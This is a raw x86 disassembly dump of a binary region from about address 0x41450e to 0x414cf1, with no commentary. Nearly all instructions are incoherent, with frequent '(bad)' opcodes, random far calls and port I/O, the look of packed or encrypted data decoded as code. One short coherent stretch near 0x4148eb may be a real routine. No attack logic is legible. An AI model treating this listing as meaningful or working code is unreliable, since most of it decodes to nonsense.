  41450e:	add    DWORD PTR [eax-0x106a7420],eax
  414514:	adc    al,0x95
  414516:	and    DWORD PTR [ebx+0x11c55fdd],0x2
  41451d:	ja     0x414597
  41451f:	mov    bh,0xcd
  414521:	dec    edx
  414522:	(bad)  
  414523:	aam    0x5c
  414525:	xchg   DWORD PTR [ecx+0x56d8eabf],eax
  41452b:	cmp    eax,0x97e94b8e
  414530:	arpl   WORD PTR [ecx-0x7481b45a],ax
  414536:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414537:	jp     0x4144db
  414539:	in     eax,0x51
  41453b:	shr    BYTE PTR [ebp+eiz*8-0x6a],1
  41453f:	sub    dl,BYTE PTR [ecx+0x72]
  414542:	sub    ebx,edx
  414544:	pop    edi
  414545:	jl     0x4145ba
  414547:	(bad)  
  41454a:	inc    edx
  41454b:	add    DWORD PTR [eax-0x6d],ecx
  41454e:	call   0xba7b:0x1b13bf00
  414555:	(bad)  
  414556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414557:	mov    eax,ds:0x2a2a8ae7
  41455c:	je     0x414576
  41455e:	sbb    DWORD PTR [edx],0x8fff5031
  414564:	or     DWORD PTR [edi],ebp
  414566:	or     BYTE PTR [ebp-0x193e93b6],0xfd
  41456d:	retf   0xcbcf
  414570:	dec    edi
  414571:	repz push ecx
  414573:	fdiv   st(0),st
  414575:	pusha  
  414576:	out    0xf7,eax
  414578:	inc    ecx
  414579:	adc    ah,ah
  41457b:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41457d:	sbb    eax,0x6578a737
  414582:	cmc    
  414583:	shr    BYTE PTR [eax],0xf
  414586:	icebp  
  414587:	cmp    DWORD PTR [esi],edx
  414589:	(bad)  
  41458a:	sar    DWORD PTR [edi],cl
  41458c:	std    
  41458d:	retf   0x78dd
  414590:	mov    bh,0x28
  414592:	ret    
  414593:	std    
  414594:	add    BYTE PTR [ebp+0x2627650d],ch
  41459a:	out    dx,al
  41459b:	fs sbb al,0x62
  41459e:	adc    DWORD PTR [esp+edi*1-0x60],0xbe2c1b9e
  4145a6:	jne    0x414586
  4145a8:	jl     0x414613
  4145aa:	in     eax,dx
  4145ab:	adc    dl,BYTE PTR ds:0x8053e9bd
  4145b1:	stos   DWORD PTR es:[edi],eax
  4145b2:	mov    ds:0xb0f99177,al
  4145b7:	jge    0x414540
  4145b9:	sbb    dh,bl
  4145bb:	out    dx,eax
  4145bc:	mov    esp,0x8d3c5a49
  4145c1:	jmp    FWORD PTR ds:[eax+eax*2+0x663b1c59]
  4145c9:	(bad)
  4145ce:	mov    eax,ds:0xb116d4bf
  4145d3:	out    0x58,eax
  4145d5:	mov    cl,bl
  4145d7:	cs jbe 0x4145e8
  4145da:	pop    ds
  4145db:	in     al,0x7e
  4145dd:	cdq    
  4145de:	fwait
  4145df:	(bad)  
  4145e0:	jg     0x414605
  4145e2:	or     al,0xeb
  4145e4:	repnz enter 0x1d9f,0x19
  4145e9:	test   al,0xd4
  4145eb:	and    BYTE PTR [ecx],0xde
  4145ee:	aam    0x42
  4145f0:	test   BYTE PTR [ebx+0x39eb207],dh
  4145f6:	and    bl,BYTE PTR ds:0x76527373
  4145fc:	mov    ebp,0x82eeda7d
  414601:	fsin   
  414603:	dec    esi
  414604:	popf   
  414605:	xor    BYTE PTR [ecx-0x5b],ah
  414608:	cmp    ebx,0xffffffbd
  41460b:	cld    
  41460c:	and    al,0x62
  41460e:	rcl    BYTE PTR [edi+ebp*2+0x6],cl
  414612:	je     0x4145c0
  414614:	lea    eax,[esi+0x7e3ba677]
  41461a:	std    
  41461b:	push   ebx
  41461c:	jmp    0x414675
  41461e:	aas    
  41461f:	adc    ah,dh
  414621:	out    0x80,eax
  414623:	lea    ecx,[esp+eax*4-0x11710194]
  41462a:	cs lock call 0xa9bb8c04
  414631:	(bad)  
  414632:	nop
  414633:	addr16 dec ebp
  414635:	call   0x47b9:0x5163401a
  41463c:	out    0x7c,al
  41463e:	adc    BYTE PTR [edi],0x17
  414641:	adc    esi,DWORD PTR [edx]
  414643:	aam    0xf4
  414645:	mov    edi,0x7f914c9
  41464a:	setle  BYTE PTR [ebx]
  41464d:	pop    esi
  41464e:	and    cl,0x88
  414651:	ds arpl bx,sp
  414654:	out    dx,eax
  414655:	pushf  
  414656:	cmp    ecx,eax
  414658:	call   0x8bd7:0xaf0fe452
  41465f:	jge    0x414649
  414661:	jmp    0x4148e9
  414666:	retf   
  414667:	ret    0xd23d
  41466a:	vpand  xmm3,xmm5,xmm1
  41466e:	ret    0xb492
  414671:	sub    BYTE PTR [edi+esi*4+0xfae0423],0x7f
  414679:	js     0x414660
  41467b:	jle    0x4146f5
  41467d:	js     0x414638
  41467f:	jo     0x414665
  414681:	mov    ah,0x2
  414683:	scas   al,BYTE PTR es:[edi]
  414684:	dec    edx
  414685:	js     0x414683
  414687:	nop
  414688:	and    edi,edi
  41468a:	dec    edi
  41468b:	push   edx
  41468c:	aam    0x76
  41468e:	stc    
  41468f:	dec    esi
  414690:	pop    esp
  414691:	scas   al,BYTE PTR es:[edi]
  414692:	jmp    0x414623
  414694:	dec    eax
  414695:	mov    cl,0x49
  414697:	sbb    ah,BYTE PTR [edx+ebp*8+0x2c]
  41469b:	mov    ebp,0x191395c0
  4146a0:	fs loop 0x414716
  4146a3:	jp     0x414637
  4146a5:	mov    bh,0x19
  4146a7:	sbb    cl,BYTE PTR [eax]
  4146a9:	mov    edi,0x10eb32da
  4146ae:	das    
  4146af:	(bad)  
  4146b0:	lock mov ds:0x13913c1e,al
  4146b6:	push   cs
  4146b7:	jl     0x414721
  4146b9:	add    ebp,DWORD PTR [ecx]
  4146bb:	in     al,dx
  4146bc:	dec    eax
  4146bd:	clc    
  4146be:	nop
  4146bf:	add    al,0xce
  4146c1:	dec    ecx
  4146c2:	ins    BYTE PTR es:[edi],dx
  4146c3:	mov    cs,eax
  4146c5:	xchg   ebx,eax
  4146c6:	push   0xe2bf08e8
  4146cb:	mov    eax,ds:0x7003c25e
  4146d0:	or     ecx,ebp
  4146d2:	xor    DWORD PTR [eax-0x6c92a60b],esp
  4146d8:	(bad)  
  4146d9:	rcr    BYTE PTR [edi-0xa3e621a],1
  4146df:	pop    ss
  4146e0:	jnp    0x4146e3
  4146e2:	xor    eax,0x29f0746c
  4146e7:	aad    0x3e
  4146e9:	sti    
  4146ea:	jns    0x414741
  4146ec:	cdq    
  4146ed:	sub    eax,0x5988f117
  4146f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146f3:	and    ch,BYTE PTR [ebx-0x32fb6a2e]
  4146f9:	adc    BYTE PTR [ebx],bh
  4146fb:	hlt    
  4146fc:	jle    0x414694
  4146fe:	lock or al,0x37
  414701:	sbb    eax,DWORD PTR [ecx-0x22]
  414704:	add    al,0x65
  414706:	std    
  414707:	sti    
  414708:	mov    ecx,DWORD PTR [edi-0x5326ebbe]
  41470e:	aad    0xba
  414710:	jb     0x41472c
  414712:	test   esi,ebp
  414714:	add    ch,BYTE PTR [eax-0x3b38e273]
  41471a:	sbb    BYTE PTR [esi],bl
  41471c:	push   0xffffffc0
  41471e:	test   al,0xb5
  414721:	popf   
  414722:	daa    
  414723:	(bad)  
  414724:	mov    cl,0xc6
  414726:	shl    BYTE PTR [eax-0x8a2bfc1],cl
  41472c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41472d:	sar    DWORD PTR [ecx],1
  41472f:	jo     0x4146ed
  414731:	sub    al,0xef
  414733:	add    dl,cl
  414735:	cmc    
  414736:	std    
  414737:	inc    ecx
  414738:	xor    eax,0xc30a4145
  41473d:	push   ebx
  41473e:	ficom  DWORD PTR [edx]
  414740:	push   ds
  414741:	cld    
  414742:	push   cs
  414743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414744:	cmc    
  414745:	push   ebx
  414746:	and    BYTE PTR [ebx-0x58f47c55],0x25
  41474d:	or     ch,BYTE PTR [edi+0x53a43689]
  414753:	cmp    al,0x98
  414755:	stos   BYTE PTR es:[edi],al
  414756:	retf   
  414757:	fld    TBYTE PTR [esi+0x6d]
  41475a:	push   esi
  41475b:	jecxz  0x4147bc
  41475d:	leave  
  41475e:	jecxz  0x41477f
  414760:	stos   BYTE PTR es:[edi],al
  414761:	and    BYTE PTR [eax-0x28],bh
  414764:	and    ah,BYTE PTR [ebx]
  414766:	push   0x30
  414768:	push   ds
  414769:	fistp  DWORD PTR [eax+0x56d57377]
  41476f:	pop    edi
  414770:	inc    esi
  414771:	lea    edi,[ebx]
  414773:	inc    edi
  414774:	sub    eax,0x7ad33378
  414779:	mov    DWORD PTR [ebp+0x6e],edi
  41477c:	mov    bl,0x57
  41477e:	retf   
  41477f:	jno    0x4147f8
  414781:	xchg   esi,eax
  414782:	ins    BYTE PTR es:[edi],dx
  414783:	aaa    
  414784:	and    BYTE PTR ds:0x53a1ab73,0xe9
  41478b:	(bad)  
  41478c:	lods   al,BYTE PTR ds:[esi]
  41478d:	adc    ebp,DWORD PTR [eax]
  41478f:	or     esp,0x8c97e08a
  414795:	js     0x4147d1
  414797:	and    edi,DWORD PTR [edx+0x6b873131]
  41479d:	adc    eax,0x8b2d7bcd
  4147a2:	aam    0x24
  4147a4:	in     al,0x12
  4147a6:	xchg   DWORD PTR [esi+0x602dd99d],ecx
  4147ac:	bound  ebp,QWORD PTR [ebx]
  4147ae:	xchg   ecx,eax
  4147af:	sbb    ebp,DWORD PTR [eax+0xcacb2fa]
  4147b5:	addr16 aad 0x26
  4147b8:	inc    eax
  4147b9:	test   al,0x21
  4147bb:	popa   
  4147bc:	jns    0x41478f
  4147be:	aam    0x18
  4147c0:	or     DWORD PTR [ecx],ecx
  4147c2:	or     eax,0x1e81c96d
  4147c7:	ror    DWORD PTR [ebx-0x25a04b88],cl
  4147cd:	je     0x4147df
  4147cf:	pop    ds
  4147d0:	mov    ebx,0x26c95009
  4147d5:	test   al,0xac
  4147d7:	das    
  4147d8:	mov    dh,0x1
  4147da:	arpl   WORD PTR [esp+edi*8],si
  4147dd:	push   ebx
  4147de:	ret    
  4147df:	enter  0x6f13,0x11
  4147e3:	jno    0x41482f
  4147e5:	rcl    BYTE PTR [edx-0x69],cl
  4147e8:	pop    edx
  4147e9:	stos   BYTE PTR es:[edi],al
  4147ea:	arpl   ax,bp
  4147ec:	pusha  
  4147ed:	(bad)  
  4147ee:	mov    ah,0x25
  4147f0:	push   ecx
  4147f1:	ret    
  4147f2:	lds    eax,FWORD PTR [edx]
  4147f4:	cmp    eax,0xe85acbe8
  4147f9:	or     eax,0x7c551b05
  4147fe:	cmc    
  4147ff:	dec    ebp
  414801:	imul   esi,DWORD PTR [edx-0x7e],0x72b23347
  414808:	xor    eax,0x1ee6f50a
  41480d:	mov    bl,ah
  41480f:	jmp    0x4147fe
  414811:	das    
  414812:	xor    al,0x61
  414814:	inc    edi
  414815:	lea    eax,[eax+0x11a5978b]
  41481b:	cld    
  41481c:	dec    eax
  41481d:	dec    esp
  41481e:	rol    BYTE PTR [eax],cl
  414820:	arpl   WORD PTR [eax-0x2bfbbaf2],bx
  414826:	inc    edx
  414827:	xchg   edi,eax
  414828:	or     ah,dh
  41482a:	pusha  
  41482b:	add    ebx,ebx
  41482d:	loopne 0x41483c
  41482f:	fdivr  QWORD PTR [edi+0x41a5ea86]
  414835:	adc    ebx,DWORD PTR [edx+ecx*8-0x1a]
  414839:	push   edx
  41483a:	ins    BYTE PTR es:[edi],dx
  41483b:	pop    ss
  41483c:	in     al,dx
  41483d:	ins    DWORD PTR es:[edi],dx
  41483e:	inc    ebp
  41483f:	inc    ebx
  414840:	push   edx
  414841:	adc    dl,BYTE PTR [edi+ebp*8]
  414844:	test   eax,0x2cb5f993
  414849:	(bad)  
  41484a:	push   edx
  41484b:	cdq    
  41484c:	jmp    0x4147f3
  41484e:	outs   dx,DWORD PTR ds:[esi]
  41484f:	pop    esp
  414850:	test   eax,0xd84be94c
  414855:	fnstsw WORD PTR [ebx+0x47]
  414858:	test   BYTE PTR [eax-0x51],0xc8
  41485c:	loopne 0x4148c8
  41485e:	or     eax,0xab92b2b5
  414863:	(bad)  
  414865:	sub    ebp,esi
  414867:	ins    BYTE PTR es:[edi],dx
  414868:	call   0x875d:0x821aee8b
  41486f:	or     ch,BYTE PTR [eiz*8-0x19314ddd]
  414876:	bound  edx,QWORD PTR [ecx]
  414878:	sbb    al,0xa2
  41487a:	jmp    0x41486e
  41487c:	and    DWORD PTR [ecx-0x44],ecx
  41487f:	add    DWORD PTR [edx-0x2b],edi
  414882:	ds ja  0x41482d
  414885:	imul   ebp,DWORD PTR gs:[edi-0x50],0xffffff93
  41488a:	hlt    
  41488b:	fsub   st,st(1)
  41488d:	add    al,0x3c
  41488f:	inc    esp
  414890:	push   edi
  414891:	div    DWORD PTR [edi]
  414893:	mov    eax,0x55069bb2
  414898:	or     DWORD PTR [eax+ebx*8],eax
  41489b:	adc    edi,edi
  41489d:	sbb    eax,ebx
  41489f:	jo     0x4148d5
  4148a1:	pushf  
  4148a2:	sti    
  4148a3:	ret    
  4148a4:	jge    0x4148aa
  4148a6:	push   ds
  4148a7:	push   0x3adf33d9
  4148ac:	loopne 0x41491e
  4148ae:	test   dl,dl
  4148b0:	xor    al,0x6a
  4148b2:	out    0xd6,eax
  4148b4:	fcmovbe st,st(3)
  4148b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148b7:	xor    ebp,DWORD PTR [esp+esi*8-0x7757f4ce]
  4148be:	leave  
  4148bf:	daa    
  4148c0:	je     0x414902
  4148c2:	cmc    
  4148c3:	in     al,dx
  4148c4:	mov    dl,0xa
  4148c6:	aaa    
  4148c7:	bound  edi,QWORD PTR [edx-0x19974a87]
  4148cd:	pushf  
  4148ce:	cmp    al,0x1a
  4148d0:	pop    esp
  4148d1:	or     esp,ebp
  4148d3:	pushf  
  4148d4:	in     eax,0xcf
  4148d6:	mov    ah,0x3f
  4148d8:	(bad)  
  4148d9:	and    esp,ebp
  4148db:	in     eax,0x12
  4148dd:	adc    BYTE PTR ds:0x68ac5c4d,al
  4148e3:	outs   dx,BYTE PTR ds:[esi]
  4148e4:	out    dx,al
  4148e5:	cmp    eax,0x338b88a0
  4148ea:	clc    
  4148eb:	add    edx,edi
  4148ed:	mov    edi,DWORD PTR [ebp-0x8]
  4148f0:	lea    edx,[edx+edi*1+0x327298]
  4148f7:	mov    DWORD PTR [ebp-0x8],edx
  4148fa:	mov    edx,DWORD PTR [ebp-0x20]
  4148fd:	xor    edx,eax
  4148ff:	mov    edi,0xffcd8d68
  414904:	sub    edi,edx
  414906:	add    edi,DWORD PTR [ebp-0x10]
  414909:	mov    edx,DWORD PTR [ebp-0x20]
  41490c:	mov    ebx,DWORD PTR [ebp-0x8]
  41490f:	jmp    0x414b97
  414914:	rcl    bh,0xc5
  414917:	(bad)  
  414918:	aad    0xda
  41491a:	leave  
  41491b:	(bad)  [eax+0x6f27854b]
  414921:	gs lock in al,0x1b
  414925:	or     al,0x7f
  414927:	js     0x41490e
  414929:	jle    0x4149a3
  41492b:	js     0x4148f8
  41492d:	stc    
  41492e:	aaa    
  41492f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414930:	sbb    al,0xf7
  414932:	loopne 0x41496a
  414934:	jle    0x41496c
  414936:	hlt    
  414937:	fdiv   QWORD PTR [eax+edx*2+0x8d35965]
  41493e:	bound  ecx,QWORD PTR [eax]
  414940:	xor    al,0xd5
  414942:	mov    BYTE PTR [edx],bl
  414944:	(bad)  
  414945:	inc    ecx
  414946:	add    DWORD PTR [ebx+0x75993b88],ebp
  41494c:	mov    bh,0x85
  41494e:	dec    ecx
  41494f:	retf   
  414950:	retf   0x136a
  414953:	icebp  
  414954:	sahf   
  414955:	pushf  
  414956:	xor    BYTE PTR [ecx+0x36],cl
  414959:	int    0x9c
  41495b:	push   eax
  41495c:	xchg   BYTE PTR [ecx],cl
  41495e:	cmp    al,0xdb
  414960:	add    eax,0x6cecba35
  414965:	ins    BYTE PTR es:[edi],dx
  414966:	cmp    DWORD PTR [edi-0x217af2c8],edi
  41496c:	xchg   ebp,eax
  41496d:	pop    ecx
  41496e:	sbb    DWORD PTR [ebx+0x70771bf1],edi
  414974:	push   es
  414975:	cmp    al,0x95
  414977:	sbb    DWORD PTR [esi+0xb],0xffffff8d
  41497b:	jl     0x4149aa
  41497d:	adc    al,0xc0
  41497f:	aas    
  414980:	dec    edx
  414981:	ror    DWORD PTR [ebx+ecx*8],cl
  414984:	push   edx
  414985:	push   ecx
  414986:	adc    al,0xae
  414988:	adc    dh,BYTE PTR [esi]
  41498a:	std    
  41498b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41498c:	setl   ah
  41498f:	fdiv   QWORD PTR ds:[eax]
  414992:	(bad)  
  414993:	mov    esi,0x5b0ca3ec
  414998:	addr16 call 0x9ccdc22e
  41499e:	jns    0x4149aa
  4149a0:	push   ecx
  4149a1:	mov    si,0xa2a2
  4149a5:	dec    ebx
  4149a6:	mov    eax,ds:0x342890b2
  4149ab:	push   eax
  4149ac:	fstp   DWORD PTR [ebx+0x67646a50]
  4149b2:	sbb    DWORD PTR [ecx],esp
  4149b4:	loopne 0x4149be
  4149b6:	sub    cl,BYTE PTR [ecx-0xa]
  4149b9:	xlat   BYTE PTR ds:[ebx]
  4149ba:	imul   edi,DWORD PTR [ecx-0x75],0x2921f4ed
  4149c1:	mov    BYTE PTR [edi],0xe
  4149c4:	mov    eax,ds:0x35d80122
  4149c9:	jle    0x414998
  4149cb:	rcr    dl,0x58
  4149ce:	repnz retf 
  4149d0:	dec    edi
  4149d1:	xchg   DWORD PTR [ebx-0x3c],edx
  4149d4:	xchg   ebx,eax
  4149d5:	inc    esp
  4149d6:	in     eax,0xc1
  4149d8:	arpl   WORD PTR [eax-0x4b],dx
  4149db:	inc    ecx
  4149dc:	aad    0xb8
  4149de:	pop    edi
  4149df:	push   eax
  4149e0:	xchg   BYTE PTR [ebx],dh
  4149e2:	cwde   
  4149e3:	jnp    0x4149f8
  4149e5:	fcomp  DWORD PTR [eax-0x76]
  4149e8:	sub    dl,BYTE PTR [ecx-0x35f005c7]
  4149ee:	push   esi
  4149ef:	mov    edx,0xa3b80313
  4149f4:	(bad)  
  4149f5:	imul   ecx,DWORD PTR [edx],0x696b2bc
  4149fb:	cmp    eax,0x73ad5afb
  414a00:	call   0xe18a:0xbbedc563
  414a07:	jb     0x414a10
  414a09:	sbb    bh,bl
  414a0b:	push   0x8dc4d4a
  414a10:	rol    ecx,cl
  414a12:	js     0x414a67
  414a14:	xchg   ebx,eax
  414a15:	mov    al,BYTE PTR ds:0xd4f0155d
  414a1b:	into   
  414a1c:	and    eax,0xa0dcf0d8
  414a21:	sbb    DWORD PTR [edx-0x9],0xa1373a3d
  414a28:	dec    edi
  414a29:	xchg   ecx,edx
  414a2b:	pop    eax
  414a2c:	xchg   ebp,eax
  414a2d:	je     0x414a63
  414a2f:	loopne 0x414a35
  414a31:	es sub cl,0xa4
  414a35:	xchg   ecx,eax
  414a36:	pusha  
  414a37:	pop    edx
  414a38:	inc    esp
  414a39:	lea    esp,[eax]
  414a3b:	jmp    0xa67eba6d
  414a40:	cmp    ebp,DWORD PTR [ebp+0x2d0c62da]
  414a46:	nop
  414a47:	mov    bh,0x17
  414a49:	xchg   ebp,eax
  414a4a:	shr    BYTE PTR [ecx],cl
  414a4c:	pusha  
  414a4d:	sbb    eax,0xe290fc4e
  414a52:	jp     0x414a88
  414a54:	mov    edx,0x6ef80c2f
  414a59:	out    dx,eax
  414a5a:	push   0x1113c3fe
  414a5f:	into   
  414a60:	rol    BYTE PTR [ebp+0x2ac7ebe0],cl
  414a66:	stos   BYTE PTR es:[edi],al
  414a67:	bound  ebx,QWORD PTR [ebp+0x4e]
  414a6a:	lahf   
  414a6b:	push   ecx
  414a6c:	mov    ebx,0xdfb76d2b
  414a71:	mov    dh,0x8
  414a73:	xor    eax,0xdb1bb0d7
  414a78:	mul    esi
  414a7a:	(bad)  
  414a7b:	stc    
  414a7c:	push   es
  414a7d:	hlt    
  414a7e:	lods   al,BYTE PTR ds:[esi]
  414a80:	(bad)  
  414a82:	dec    ebx
  414a83:	push   0x200be89c
  414a88:	cli    
  414a89:	sub    al,0x32
  414a8b:	jne    0x414aa6
  414a8d:	jmp    0xc7171588
  414a92:	xchg   esi,eax
  414a93:	inc    ebx
  414a94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a95:	test   BYTE PTR [eax],0xb9
  414a98:	cwde   
  414a99:	ret    
  414a9a:	fnstsw WORD PTR [esi]
  414a9c:	ror    BYTE PTR [eax+ebx*4],1
  414a9f:	xor    esp,ecx
  414aa1:	push   ebx
  414aa2:	cmc    
  414aa3:	int    0x96
  414aa5:	push   ebx
  414aa6:	leave  
  414aa7:	sub    ecx,ebx
  414aa9:	or     DWORD PTR [edx],ebx
  414aab:	int    0xf2
  414aad:	addr16 push ds
  414aaf:	(bad)  
  414ab0:	dec    esp
  414ab1:	in     al,0x9a
  414ab3:	ret    0xa337
  414ab6:	or     eax,0x9bc3edd4
  414abb:	sbb    BYTE PTR [edi+0x2a543daa],0xdf
  414ac2:	enter  0x7cd6,0xea
  414ac6:	lahf   
  414ac7:	mov    ds:0xf44b7823,eax
  414acc:	movlps QWORD PTR [ecx-0x7ce074db],xmm5
  414ad3:	mov    DWORD PTR [esi+0x13],ebx
  414ad6:	iret   
  414ad7:	test   bl,dh
  414ad9:	pop    esi
  414ada:	pop    ss
  414adb:	jne    0x414afd
  414add:	int    0xf0
  414adf:	sbb    al,0x60
  414ae1:	ds test al,0xcb
  414ae4:	mov    esp,0x6a9fcda5
  414ae9:	js     0x414b5a
  414aeb:	js     0x414b37
  414aed:	stos   DWORD PTR es:[edi],eax
  414aee:	adc    DWORD PTR [ecx],ebx
  414af0:	mov    edx,0x98720197
  414af5:	mov    edi,0x2e5c1eba
  414afa:	inc    edi
  414afb:	aaa    
  414afc:	jge    0x414b02
  414afe:	sub    eax,0x319e9c33
  414b03:	cwde   
  414b04:	mov    ebp,0xae756320
  414b09:	call   0x3526:0x72c11c3a
  414b10:	dec    edi
  414b11:	pushf  
  414b12:	cmp    ch,BYTE PTR [ebp+0x4be0a08c]
  414b18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b19:	dec    ebx
  414b1a:	mov    ecx,DWORD PTR [edx+0x433abf2a]
  414b20:	push   cs
  414b21:	xlat   BYTE PTR ds:[ebx]
  414b22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b23:	lods   eax,DWORD PTR ds:[esi]
  414b24:	pop    edx
  414b25:	and    ah,0x39
  414b28:	mov    BYTE PTR ds:0x2de59efe,al
  414b2e:	jp     0x414af3
  414b30:	in     eax,0xb2
  414b32:	jo     0x414b99
  414b34:	sbb    bh,ch
  414b36:	adc    BYTE PTR [ecx-0xce3cb5d],bl
  414b3c:	daa    
  414b3d:	sub    eax,DWORD PTR [ecx]
  414b3f:	retf   0xa0b9
  414b42:	fbld   TBYTE PTR [edx+esi*8+0x308a2312]
  414b49:	push   ecx
  414b4a:	addr16 out dx,eax
  414b4c:	push   0xd117e499
  414b51:	add    al,BYTE PTR [si]
  414b54:	jne    0x414b29
  414b56:	sub    edx,DWORD PTR [esi+0x749162f7]
  414b5c:	sbb    eax,DWORD PTR [esi]
  414b5e:	and    BYTE PTR [esi+0x19c2c9f8],0x22
  414b65:	mov    ecx,0x5466758e
  414b6a:	inc    edx
  414b6b:	sub    al,0xa1
  414b6d:	daa    
  414b6e:	retf   
  414b6f:	cs add eax,0xacaaed85
  414b75:	(bad)  
  414b76:	pop    ebp
  414b77:	adc    bh,al
  414b79:	add    bl,dl
  414b7b:	fwait
  414b7c:	rsm    
  414b7e:	inc    esi
  414b7f:	dec    edi
  414b80:	test   al,0x14
  414b82:	push   ds
  414b83:	inc    eax
  414b84:	scas   al,BYTE PTR es:[edi]
  414b85:	pop    ss
  414b86:	sbb    eax,0xf84992c9
  414b8b:	shr    DWORD PTR [ebx],0xe6
  414b8e:	in     eax,dx
  414b8f:	pop    ebx
  414b90:	and    ecx,DWORD PTR [ecx+0x584df6ac]
  414b96:	and    al,0x33
  414b98:	rol    BYTE PTR [ebx],1
  414b9a:	ror    DWORD PTR [edi],1
  414b9c:	scas   eax,DWORD PTR es:[edi]
  414b9d:	sar    DWORD PTR [ebx],cl
  414b9f:	xlat   BYTE PTR ds:[ebx]
  414ba0:	jmp    0x414e28
  414ba5:	int    0xc1
  414ba7:	cmp    al,0xca
  414ba9:	int3   
  414baa:	leave  
  414bab:	aad    0xd9
  414bad:	xchg   esp,eax
  414bae:	mov    ch,0x6d
  414bb0:	dec    edx
  414bb1:	fisttp DWORD PTR [eax+0x36]
  414bb4:	in     eax,0x80
  414bb6:	adc    bh,BYTE PTR [edi+0x78]
  414bb9:	in     eax,0x7e
  414bbb:	js     0x414c35
  414bbd:	mov    cl,0xeb
  414bbf:	xchg   ebp,eax
  414bc0:	or     BYTE PTR [eax-0x57945abf],ah
  414bc6:	in     eax,dx
  414bc7:	int3   
  414bc8:	(bad)  
  414bca:	push   0xffffffbe
  414bcc:	adc    eax,0x1fe65810
  414bd1:	adc    eax,0x491f66b9
  414bd6:	adc    eax,0xd0a62666
  414bdb:	xchg   edx,eax
  414bdc:	xchg   edx,eax
  414bdd:	mov    ecx,0x73dc939c
  414be2:	sub    BYTE PTR [ebx-0x211754c8],dh
  414be8:	xor    DWORD PTR [ebp+0x6d],ebx
  414beb:	mov    edx,0xbc23aa1a
  414bf0:	sub    DWORD PTR [edx+0x27],eax
  414bf3:	pop    edi
  414bf4:	mov    esi,0xc32687a6
  414bf9:	(bad)  
  414bfa:	lahf   
  414bfb:	fisttp QWORD PTR [ecx+ebx*8+0xd]
  414bff:	daa    
  414c00:	fild   QWORD PTR [esi+edi*1+0x47]
  414c04:	sar    BYTE PTR [edx+0x3fa026cc],1
  414c0a:	dec    edx
  414c0b:	jmp    0x1c2ae50b
  414c10:	sbb    dl,BYTE PTR [ecx-0x1cfad37]
  414c16:	lods   eax,DWORD PTR ds:[esi]
  414c17:	dec    ebx
  414c18:	pop    eax
  414c19:	jb     0x414b9e
  414c1b:	loop   0x414c80
  414c1d:	retf   0x4dda
  414c20:	das    
  414c21:	std    
  414c22:	mov    cl,BYTE PTR [esp+edi*8]
  414c25:	jb     0x414c57
  414c27:	cdq    
  414c28:	mov    ebp,0x8e2e05b
  414c2d:	ins    DWORD PTR es:[edi],dx
  414c2e:	ins    BYTE PTR es:[edi],dx
  414c2f:	outs   dx,BYTE PTR ds:[esi]
  414c30:	cmp    eax,0x6b05635
  414c35:	test   BYTE PTR [esi],ch
  414c37:	push   ebp
  414c38:	push   esp
  414c39:	(bad)  
  414c3a:	mov    ds:0xf4191e70,al
  414c3f:	fs mov esp,0x11759601
  414c45:	cmc    
  414c46:	mov    eax,ds:0xc9933ffe
  414c4b:	jo     0x414cbe
  414c4d:	xlat   BYTE PTR ds:[ebx]
  414c4e:	lods   eax,DWORD PTR ds:[esi]
  414c4f:	pushf  
  414c50:	in     eax,dx
  414c51:	mov    ebx,0xcc935d8e
  414c56:	cdq    
  414c57:	push   edi
  414c58:	repnz push cs
  414c5a:	push   eax
  414c5b:	arpl   WORD PTR [esi+0x59774daa],di
  414c61:	adc    al,dh
  414c63:	pop    esi
  414c64:	ins    DWORD PTR es:[edi],dx
  414c65:	adc    dh,BYTE PTR ds:0xae3f23ea
  414c6b:	xchg   ecx,eax
  414c6c:	dec    ebx
  414c6d:	fs mov cl,bl
  414c70:	push   0x1713b4ec
  414c75:	loope  0x414cb7
  414c77:	cwde   
  414c78:	xor    esi,DWORD PTR [esi]
  414c7a:	je     0x414ce8
  414c7c:	jmp    0x414cef
  414c7e:	gs shr cx,1
  414c82:	retf   
  414c83:	mov    ebp,ebx
  414c85:	jnp    0x414c28
  414c87:	push   ecx
  414c88:	add    eax,0x27a89863
  414c8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c8e:	into   
  414c8f:	(bad)  [ebp-0x2a]
  414c92:	sbb    al,0x87
  414c94:	xchg   esp,eax
  414c95:	mov    ecx,0x17e65e1
  414c9a:	push   esi
  414c9b:	popa   
  414c9c:	dec    edi
  414c9d:	push   cs
  414c9e:	adc    bh,BYTE PTR [esi+0x45]
  414ca1:	retf   
  414ca2:	sti    
  414ca3:	add    ecx,DWORD PTR [ebp+edi*8-0x572e2080]
  414caa:	push   edi
  414cab:	fcomp  DWORD PTR [ebp+0x5b32678c]
  414cb1:	dec    edi
  414cb2:	int3   
  414cb3:	je     0x414d23
  414cb5:	in     al,dx
  414cb6:	add    BYTE PTR [esi+0x4b],bl
  414cb9:	lahf   
  414cba:	daa    
  414cbb:	lods   al,BYTE PTR ds:[esi]
  414cbc:	(bad)  
  414cbe:	dec    ecx
  414cbf:	xor    DWORD PTR [ecx+0x7b],0x416afe12
  414cc6:	adc    eax,0x1846443
  414ccb:	and    eax,0xfd3585eb
  414cd0:	std    
  414cd1:	hlt    
  414cd2:	push   ss
  414cd3:	jbe    0x414cb0
  414cd5:	cs xchg edx,eax
  414cd7:	dec    ebp
  414cd8:	mov    bh,0xd3
  414cda:	ja     0x414cc5
  414cdc:	or     esp,DWORD PTR [edi]
  414cde:	stc    
  414cdf:	in     eax,dx
  414ce0:	addr16 cmc 
  414ce2:	mov    ebx,0xa3141955
  414ce7:	or     edi,DWORD PTR [ebx+ebx*1-0x1f]
  414ceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cec:	iret   
  414ced:	mov    al,0x88
  414cef:	in     eax,0x62
  414cf1:	pop    ecx
